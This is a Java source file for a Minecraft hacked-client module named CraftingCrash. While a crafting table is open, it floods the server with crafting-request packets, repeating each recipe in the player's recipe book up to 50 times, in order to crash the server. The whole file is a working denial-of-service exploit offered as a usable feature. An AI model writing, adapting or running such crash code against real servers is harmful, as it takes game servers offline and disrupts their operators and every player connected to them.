package me.dustin.crash.feature;

import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.option.annotate.Op;
import me.dustin.jex.helper.misc.ChatHelper;
import me.dustin.jex.helper.misc.Wrapper;
import me.dustin.jex.helper.network.NetworkHelper;
import net.minecraft.client.gui.screen.recipebook.RecipeResultCollection;
import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
import net.minecraft.recipe.Recipe;
import net.minecraft.screen.CraftingScreenHandler;

import java.util.List;

@Feature.Manifest(category = Feature.Category.MISC, description = "Spam craft request packets. Use with planks in inventory for best results.")
public class CraftingCrash extends Feature {

    @Op(name = "Packet Count", min = 1, max = 50, inc = 1)
    public int packetCount = 24;
    @Op(name = "Auto Disable")
    public boolean autoDisable = true;

    public CraftingCrash() {
        setFeatureCategory(Category.valueOf("CRASH"));
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        if (!(Wrapper.INSTANCE.getLocalPlayer().currentScreenHandler instanceof CraftingScreenHandler) || Wrapper.INSTANCE.getMinecraft().getNetworkHandler() == null) return;
        try {
            List<RecipeResultCollection> recipeResultCollectionList = Wrapper.INSTANCE.getLocalPlayer().getRecipeBook().getOrderedResults();
            for (RecipeResultCollection recipeResultCollection : recipeResultCollectionList) {
                for (Recipe<?> recipe : recipeResultCollection.getRecipes(true)) {
                    for (int i = 0; i < packetCount; i++) {
                        NetworkHelper.INSTANCE.sendPacket(new CraftRequestC2SPacket(Wrapper.INSTANCE.getLocalPlayer().currentScreenHandler.syncId, recipe, true));
                    }
                }
            }
        } catch (Exception ignored) {
            ChatHelper.INSTANCE.addClientMessage("Stopping crash because an error occurred!");
            setState(false);
        }
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.POST));


    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisable)
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));
}
